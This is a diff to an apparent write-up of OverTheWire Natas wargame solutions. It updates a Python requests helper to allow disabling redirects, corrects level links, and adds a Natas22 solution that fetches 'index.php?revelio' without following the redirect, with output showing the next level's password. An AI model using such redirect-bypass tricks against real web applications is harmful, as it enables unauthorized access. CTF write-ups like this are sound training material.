@@ -22,17 +22,18 @@ https://overthewire.org/wargames/natas/
 ```python
 import requests
 
-def natasX(x, pwd, endpoint="", headers={}, cookies={}, data={}, url=""):
+def natasX(x, pwd, endpoint="", headers={}, cookies={}, data={}, url="", redirect=True):
     if url != "":
         username = f"natas{x}"
-        r = requests.get(url, auth=(username, pwd), headers=headers, cookies=cookies, params=data)
+        r = requests.get(url, auth=(username, pwd), headers=headers, cookies=cookies, params=data, allow_redirects=redirect)
     else:
         url = f'http://natas{x}.natas.labs.overthewire.org/{endpoint}'
         username = f"natas{x}"
 
-        r = requests.get(url, auth=(username, pwd), headers=headers, cookies=cookies, params=data)
+        r = requests.get(url, auth=(username, pwd), headers=headers, cookies=cookies, params=data, allow_redirects=redirect)
 
     return r
+
  ```
 
 ## Natas0
@@ -804,7 +805,7 @@ WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
 
 
 ## Natas16
-https://overthewire.org/wargames/natas/natas15.html
+https://overthewire.org/wargames/natas/natas16.html
 
 > Natas Level 15 → Level 16
 
@@ -1104,7 +1105,7 @@ Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>
 ```
 
 ## Natas20
-https://overthewire.org/wargames/natas/natas21.html
+https://overthewire.org/wargames/natas/natas20.html
 
 > Natas Level 19 → Level 20
 
@@ -1204,13 +1205,72 @@ Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ</pre>
 ```
 
 ## Natas22
-https://overthewire.org/wargames/natas/natas21.html
+https://overthewire.org/wargames/natas/natas22.html
 
 > Natas Level 21 → Level 22
 
 > Username: natas22
 
 > URL:      http://natas22.natas.labs.overthewire.org
+
+```python
+import natasX
+
+natas = natasX
+
+print(natas.natasX(22, "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ", endpoint="index.php?revelio", redirect=False).text)
+```
+
+**Output**
+
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas22", "pass": "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ" };</script></head>
+<body>
+<h1>natas22</h1>
+<div id="content">
+
+You are an admin. The credentials for the next level are:<br><pre>Username: natas23
+Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE</pre>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+## Natas23
+https://overthewire.org/wargames/natas/natas23.html
+
+> Natas Level 22 → Level 23
+
+> Username: natas23
+
+> URL:      http://natas23.natas.labs.overthewire.org
+
+```python
+```
+
+**Output**
+
+```html
+```
+
+## Natas24
+https://overthewire.org/wargames/natas/natas24.html
+
+> Natas Level 23 → Level 24
+
+> Username: natas24
+
+> URL:      http://natas24.natas.labs.overthewire.org
 
 ```python
 ```
